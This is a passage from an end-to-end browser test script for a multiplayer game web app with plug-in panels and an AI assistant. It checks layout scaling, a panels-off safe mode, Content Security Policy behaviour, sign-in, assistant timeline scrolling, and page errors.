  assert(panel.rects.length > 0 && panel.rects.every(r => Number.isFinite(r.yours) && Number.isFinite(r.others)), "every rectangle labels both edges");
  // One scale for both axes: where both sides are well above the minimum, width : height = yours : others.
  for (const r of panel.rects.filter(r => r.kind === "gain" && r.w > 8 && r.h > 8 && r.others > 0)) {
    const drawn = r.w / r.h, values = Math.abs(r.yours) / r.others;
    assert(Math.abs(drawn / values - 1) < 0.1, `rectangle ${r.w}×${r.h} for ${r.yours} × ${r.others} is not to scale`);
  }
  // The bar mixes the ramp in linear light, so the browser may report it as color(srgb-linear …): compare as sRGB bytes.
  const srgb = (css: string) => {
    const lin = /^color\(srgb-linear ([\d.e-]+) ([\d.e-]+) ([\d.e-]+)/.exec(css);
    if (lin) return lin.slice(1, 4).map(Number).map(c => Math.round(255 * (c <= 0.0031308 ? 12.92 * c : 1.055 * c ** (1 / 2.4) - 0.055)));
    return (/^rgba?\((\d+), (\d+), (\d+)/.exec(css) ?? []).slice(1, 4).map(Number);
  };
  if (panel.rects[0].kind === "gain") assert(srgb(panel.topBar).join() === "154,96,5", `the top object's bar is ${panel.topBar}, not the ramp's strong end #9a6005`);
  assert(panel.scrollWidth <= 390, `the page scrolls sideways: ${panel.scrollWidth}px`);
  await phoneContext.close();
  await owner("endGame");
});

await check("?panels=off loads only the built-in panels and the assistant", async () => {
  const safe = await context.newPage();
  await safe.goto(`${SITE}/player/?room=${shortCode}&panels=off`);
  await safe.waitForSelector("[data-testid=text-self-label]", { timeout: 60_000 });
  await safe.waitForSelector("[data-testid=text-safe-mode]");
  await safe.waitForSelector("[data-testid=dock] [data-testid=assistant-pane]");
  await sleep(1500);
  assert(await safe.locator("[data-panel-origin]").count() === 0, "panels rendered in safe mode");
  assert(await safe.locator("[data-testid=dock] [data-testid=menu-panel]").count() >= 1, "no panel in safe mode");
  await safe.close();
});

await check("the hosted page runs under its CSP without violations of its own", async () => {
  const csp = await page.getAttribute('meta[http-equiv="Content-Security-Policy"]', "content");
  assert(csp?.includes("connect-src 'self' " + new URL(CLOUD).origin), `page CSP: ${csp}`);
  // Expected: the navigating panel's frame was refused by frame-src (checked above).
  const own = cspReports.filter(t => !t.includes(`Framing '${BEACON}/`));
  assert(own.length === 0, own.slice(0, 2).join(" | "));
});

await check("sign-in still works under the page CSP: the signed-out page offers it and the link reaches the provider", async () => {
  const fresh = await browser.newContext();
  const out = await fresh.newPage();
  const reports: string[] = [];
  out.on("console", m => { if (/Content Security Policy/i.test(m.text())) reports.push(m.text()); });
  await out.goto(`${SITE}/player/?room=${shortCode}`);
  await out.waitForSelector("[data-testid=link-login]", { timeout: 60_000 });
  await Promise.all([out.waitForURL(url => !url.href.startsWith(`${SITE}/player/`), { timeout: 30_000 }), out.click("[data-testid=link-login]")]);
  assert(reports.length === 0, reports.slice(0, 2).join(" | "));
  await fresh.close();
});

await check("the assistant timeline stays at the bottom when the suggestion chips appear under a long answer (mock provider)", async () => {
  // Real-provider testing hid the end of an answer under the chips: the timeline shrank without scrolling.
  const other = await carol.mutation(fn.m("rooms:create"), { assistantBudget: 400_000 }) as { roomId: string; shortCode: string };
  await carol.mutation(fn.m("rooms:approveAiBudget"), { roomId: other.roomId, aiBudget: 0, assistantBudget: 400_000 });
  const chat = await browser.newContext({ viewport: { width: 1200, height: 700 } });
  await chat.addCookies(sessionCookies(session));
  const p = await chat.newPage();
  p.on("pageerror", e => pageErrors.push(`timeline: ${e.message}`));
  await p.goto(`${SITE}/player/?room=${other.shortCode}`);
  await p.waitForSelector("[data-testid=input-assistant]", { timeout: 60_000 });
  const lines = Array.from({ length: 40 }, (_, i) => `line ${i + 1}\n`);
  await p.fill("[data-testid=input-assistant]", `/mock ${JSON.stringify({ steps: [{ text: [...lines, "THE END"] }] })}`);
  await p.click("[data-testid=button-assistant-send]");
  await p.waitForSelector("[data-testid=assistant-chips]", { timeout: 60_000 });
  await sleep(500);
  const gap = await p.$eval("[data-testid=assistant-timeline]", el => el.scrollHeight - el.scrollTop - el.clientHeight);
  assert(gap < 24, `the end of the answer is ${gap}px below the visible timeline`);
  await chat.close();
});

await check("no uncaught page errors in the host", () => assert(pageErrors.length === 0, pageErrors.slice(0, 3).join(" | ")));

for (const slug of ["e2e-live", "e2e-throws", "e2e-hostile", "e2e-chat", "e2e-eval"]) await carol.mutation(fn.m("panels:remove"), { slug }).catch(() => {});
await browser.close();
beacon.close();
const failed = results.filter(r => !r.ok);
console.log(`\n${results.length - failed.length}/${results.length} checks passed`);
process.exit(failed.length ? 1 : 0);
